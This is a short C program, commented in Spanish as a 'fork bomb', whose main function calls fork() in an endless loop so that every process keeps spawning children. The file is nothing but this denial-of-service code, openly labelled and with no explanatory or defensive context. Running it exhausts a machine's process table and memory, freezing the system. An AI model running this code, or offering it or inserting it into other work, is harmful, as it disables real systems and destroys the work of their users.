// Bomba fork: cada proceso crea hijos sin parar.
#include <unistd.h>
int main() {
    while (true) fork();
    return 0;
}
